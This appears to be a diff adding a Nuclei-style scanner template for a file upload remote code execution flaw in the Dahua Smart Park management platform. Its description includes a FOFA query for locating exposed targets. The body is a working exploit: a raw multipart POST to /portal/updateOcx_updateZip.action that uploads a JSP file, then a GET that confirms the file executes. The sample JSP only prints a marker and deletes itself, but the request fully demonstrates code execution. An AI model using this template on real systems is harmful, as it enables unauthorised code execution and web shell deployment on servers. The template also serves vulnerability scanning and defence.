@@ -1,0 +1,48 @@
+id: dahua-smartpark-updatezip-upload
+info:
+  name: "大华智慧园区系统 updateOcx_updateZip.action 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="dahua-智慧园区综合管理平台"
+        大华智慧园区系统 updateOcx_updateZip.action 接口存在文件上传功能缺陷，攻击者可利用该漏洞在目标服务器上部署恶意文件，进而实现远程代码执行或Web内容篡改，从而对系统完整性和数据机密性构成严重威胁。
+        示例上传路径格式：http://xx.xx.xx.xx/portal/ocx/{ 文件上传时间戳20240801102132}/NTest.jsp
+  tags: 大华智慧园区系统
+
+http:
+- raw:
+  - |
+    POST /portal/updateOcx_updateZip.action HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: identity
+    Accept-Language: zh-CN,zh;q=0.8
+    Accept: */*
+    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+    Connection: keep-alive
+    Cache-Control: max-age=0
+    Content-Type: multipart/form-data; boundary=9aa1b50e33144fb18837cc97ed863df7
+
+    --9aa1b50e33144fb18837cc97ed863df7
+    Content-Disposition: form-data; name="updateBean.compressFileName"
+
+    NTest.jsp
+    --9aa1b50e33144fb18837cc97ed863df7
+    Content-Disposition: form-data; name="updateBean.compress"; filename="NTest.jsp"
+    Content-Type: text/plain
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --9aa1b50e33144fb18837cc97ed863df7--
+
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - "NdayTest"
